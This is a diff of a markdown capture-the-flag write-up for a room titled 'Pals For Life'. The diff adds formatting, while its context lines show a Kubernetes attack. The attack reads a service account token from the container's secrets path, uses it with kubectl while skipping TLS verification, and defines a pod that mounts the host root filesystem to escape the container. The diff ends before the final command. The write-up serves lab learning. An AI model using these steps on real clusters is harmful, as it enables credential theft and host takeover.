@@ -1,3 +1,9 @@
+# Pals For Life
+
+![image](https://user-images.githubusercontent.com/86648102/135341140-8a711e05-557d-44c8-a326-d243c4a6c260.png)
+
+---
+
 ## Task 1 Deploy the VM
 
 
@@ -149,6 +155,7 @@ As the hint says "kubectl", this one is about Kubernetes (Port 6443)
 > By default, the containers in the Kubernetes cluster will hold service account token within their file system. If an attacker could find that token, he/she can use it to move laterally or depending the privilege of the service account, one can escalate its privilege to further compromise the cluster environment
 
 `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
+
 > Output the token to a text file for later usage.
 
 - Usage of it:
@@ -156,6 +163,7 @@ As the hint says "kubectl", this one is about Kubernetes (Port 6443)
 `kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 auth can-i --list`
 
 Apparently, we can do anything with it.
+
 ![image](https://user-images.githubusercontent.com/86648102/134915608-1fc9f376-8b15-4615-a423-4d2c2007f73c.png)
 
 As, we have the permissions, let's check the secret resources:
@@ -174,7 +182,7 @@ As, we have the permissions, let's check the secret resources:
 We will create a new pod and abuse this.
 Create a **host.yaml**
 
-apiVersion: v1
+```apiVersion: v1
 kind: Pod
 metadata:
   name: host
@@ -191,7 +199,7 @@ spec:
   - name: host
     hostPath:
       path: /
-      type: Directory
+      type: Directory```
 
 And then run the following command:
   
